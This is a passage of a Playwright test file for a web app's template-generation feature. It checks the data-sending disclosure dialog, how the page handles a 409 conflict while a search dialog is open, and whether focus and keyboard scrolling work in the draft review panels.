    await expect(page.getByTestId('generate-status-CustomHeader')).toHaveText('The data to be sent changed.');
    await expect(page.getByTestId('generate-review-again-CustomHeader')).toBeVisible();
    await page.waitForTimeout(300);
    await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);

    await page.getByTestId('generate-review-again-CustomHeader').click();
    await expect(page.getByTestId('generation-disclosure')).toBeVisible();
  });

  test('a 409 arriving while search is open leaves only search open, and Review again is refused over it', async ({ page }) => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => { release = resolve; });
    await spyGenerate(page, () => ({ status: 409, body: { error: 'the data to be sent changed; review it again' } }), gate);
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);

    await page.keyboard.press('ControlOrMeta+k');
    const search = page.getByRole('dialog', { name: 'Search' });
    await expect(search).toBeVisible();
    release();
    await expect(page.getByTestId('generate-status-CustomHeader')).toHaveText('The data to be sent changed.');
    await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);
    const input = search.getByRole('combobox', { name: 'Search' });
    await input.fill('abc');
    await expect(input).toHaveValue('abc');

    // The page behind search is inert, so press Review again from script.
    await page.getByTestId('generate-review-again-CustomHeader').evaluate((el: HTMLElement) => el.click());
    await expect(search.getByRole('status')).toHaveText('Close this dialog first to review what template generation will send.');
    await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);
    await expect(search).toBeVisible();
  });

  test('the whole-template panel opens the disclosure too, and focus returns to its Generate', async ({ page }) => {
    const sent: unknown[] = [];
    await page.route('**/v1/category/generateTemplate', async (route) => {
      const body = route.request().postDataJSON();
      if (body?.dryRun) {
        await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(stubDisclosure) });
        return;
      }
      sent.push(body);
      await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomCSS: '.a{}' } }) });
    });
    await page.goto('/category/new');
    await page.getByTestId('template-bundle-generate-prompt').fill('a template');
    const generate = page.getByTestId('template-bundle-generate-button');
    await generate.click();
    await page.getByTestId('generation-disclosure-cancel').click();
    await expect(generate).toBeFocused();
    expect(sent).toHaveLength(0);

    await generate.click();
    await sendDisclosure(page);
    await expect(page.getByTestId('template-bundle-review')).toBeVisible();
    await expect(generate).toBeFocused();
    expect(sent).toHaveLength(1);
  });
});

// The review panel is removed by Apply and Discard, which hold focus; the draft
// text is long and capped, so it must be reachable and scrollable by keyboard.
test.describe('Draft review panels and the keyboard', () => {
  const pairReply = { target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>Draft</h1>', CustomHeaderCSS: '.d{}' } };
  const bundleReply = { target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>Draft</h1>', CustomHeaderCSS: '' } };
  async function stub(page: Page, reply: unknown) {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(reply) });
    }));
  }

  for (const action of ['apply', 'discard']) {
    test(`${action} on a pair draft returns focus to Generate`, async ({ page }) => {
      await stub(page, pairReply);
      await page.goto('/category/new');
      await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
      await page.getByTestId('generate-button-CustomHeader').click();
      await sendDisclosure(page);
      await page.getByTestId(`generate-${action}-CustomHeader`).click();
      await expect(page.getByTestId('generate-review-CustomHeader')).toHaveCount(0);
      await expect(page.getByTestId('generate-button-CustomHeader')).toBeFocused();
    });

    test(`${action} on a whole-template draft returns focus to Generate`, async ({ page }) => {
      await stub(page, bundleReply);
      await page.goto('/category/new');
      await page.getByTestId('template-bundle-generate-prompt').fill('a template');
      await page.getByTestId('template-bundle-generate-button').click();
      await sendDisclosure(page);
      await page.getByTestId(`template-bundle-${action}`).click();
      await expect(page.getByTestId('template-bundle-review')).toHaveCount(0);
      await expect(page.getByTestId('template-bundle-generate-button')).toBeFocused();
    });
  }

  test('Tab reaches the pair draft text, a named scrollable region', async ({ page }) => {
    const long = { ...pairReply, slots: { CustomHeader: Array.from({ length: 80 }, (_, i) => `<p>line ${i}</p>`).join('\n'), CustomHeaderCSS: '.d{}' } };
    await stub(page, long);
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);
    await expect(page.getByTestId('generate-status-CustomHeader')).toContainText('ready');
    await expect(page.getByTestId('generate-button-CustomHeader')).toBeFocused();
    const text = page.getByRole('region', { name: 'Draft text of CustomHeader', exact: true });
    await tabUntilFocused(page, text);
    await page.keyboard.press('PageDown');
    await expect.poll(() => text.evaluate((el) => el.scrollTop)).toBeGreaterThan(0);
  });

  test('Tab reaches the whole-template draft text, a named scrollable region', async ({ page }) => {
    await stub(page, bundleReply);
    await page.goto('/category/new');
    await page.getByTestId('template-bundle-generate-prompt').fill('a template');
    await page.getByTestId('template-bundle-generate-button').click();
    await sendDisclosure(page);
    await expect(page.getByTestId('template-bundle-generate-button')).toBeFocused();
    await tabUntilFocused(page, page.getByRole('region', { name: 'Draft text of CustomHeader', exact: true }));
  });

  test('answering the disclosure at once leaves no focus trap behind', async ({ page }) => {
    await stub(page, bundleReply);
    await page.goto('/category/new');
    await page.getByTestId('template-bundle-generate-prompt').fill('a template');
    // Send in the same task the dialog opens in, before x-trap arms (15ms).
    await page.evaluate(async () => {
      const store = (window as any).Alpine.store('generationDisclosure');
      (document.querySelector('[data-testid="template-bundle-generate-button"]') as HTMLButtonElement).click();
      while (!store.isOpen) await new Promise((r) => setTimeout(r, 0));
      store.send();
    });
    await expect(page.getByTestId('template-bundle-review')).toBeVisible();
    await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);
    await page.waitForTimeout(100);
    await page.getByTestId('template-bundle-generate-button').focus();
    const tab = page.evaluate(() => new Promise<boolean>((resolve) => {
      document.addEventListener('keydown', (e) => setTimeout(() => resolve(e.defaultPrevented), 0), { once: true });
    }));
    await page.keyboard.press('Tab');
    expect(await tab).toBe(false);
  });
});
